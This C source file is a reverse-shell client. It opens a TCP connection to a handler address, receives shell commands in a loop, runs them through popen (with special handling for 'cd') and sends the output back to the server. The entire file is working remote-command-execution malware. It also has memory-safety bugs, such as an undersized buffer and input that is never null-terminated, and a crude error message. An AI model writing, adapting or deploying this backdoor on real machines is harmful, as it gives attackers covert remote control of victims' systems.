#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>

#define HOST "127.0.0.1"
#define PORT 8843
#define BUFFERSIZE 1024

/**
 * Run command in subprocess and return its stdout
 * @param command
 * @return
 */
char* exec_subproc(char* command){
    const int readbuffersize = 100;
    const float growthfactor = 2;

    int outputSize = 100;
    char* output = malloc(sizeof(char) * outputSize);
    int length_counter = 0;

    FILE *fptr;
    fptr = popen(command, "r");

    char output_buffer[readbuffersize];
    while((fgets(output_buffer, sizeof(output_buffer), fptr)) != NULL) {
        if(outputSize - length_counter < readbuffersize) {
            outputSize = (int) ceil(outputSize * growthfactor);
            output = realloc(output, outputSize);
        }

        strcpy(output + length_counter, output_buffer);
        length_counter += (int) strlen(output_buffer);
    }

    pclose(fptr);
    fptr = NULL;

    return output;
}

/**
 * Handle handlercommands
 * @param command
 * @return
 */
char* execute(char* command) {
    char* output_string;

    if(strncmp(command, "cd ", 3) == 0 && strlen(command) >= 4) {
        output_string = malloc(sizeof (char) * 30);
        if(chdir(command + 3) == 0) strcpy(output_string, "Change directory successful");
        else strcpy(output_string, "Change directory not successful");
    } else {

        //check validity of command
        char check[] = "command -v ";
        char* checkCommand = malloc((strlen(check) + strlen(command)) * sizeof(char));
        strcpy(checkCommand, check);
        strcat(checkCommand, command);
        char* response = exec_subproc(checkCommand);

        if(strlen(response) == 0){
            //invalid command as per "command -v"
            free(response);

            output_string = malloc(38 * sizeof(char));
            strcpy(output_string, "Command invalid; if not got suck dick");
            return output_string;
        }

        output_string = exec_subproc(command);
    }
    return output_string;
}

int main(void) {
    int sock_ret;
    struct sockaddr_in sock;

    // Create Socket in memory
    sock_ret = socket(AF_INET, SOCK_STREAM, 0);
    if(sock_ret == -1) {
        printf("Could not create socket\n");
        return -1;
    }

    // Convert IPV4 to binary and set port and tcp
    sock.sin_addr.s_addr = inet_addr(HOST);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(PORT);

    // Connect to remote socket
    if(connect(sock_ret, (struct sockaddr *)&sock, sizeof(sock)) < 0) {
        printf("Could not connect to remote\n");
        return -1;
    }

    // Command execution loop
    while(1) {

        // Receive command from server
        char sock_buffer[BUFFERSIZE];
        if(recv(sock_ret, sock_buffer, BUFFERSIZE, 0) < 0) {
            printf("Error while receiving from server\n");
            return -1;
        }
        char* output = execute(sock_buffer);

        // Send output
        if(send(sock_ret, output, strlen(output), 0) < 0) {
            printf("Error while sending\n");
            return -1;
        }

        // Handle buffers
        memset(sock_buffer, 0, sizeof(sock_buffer));
        free(output);
        output = NULL;
    }
    return 0;
}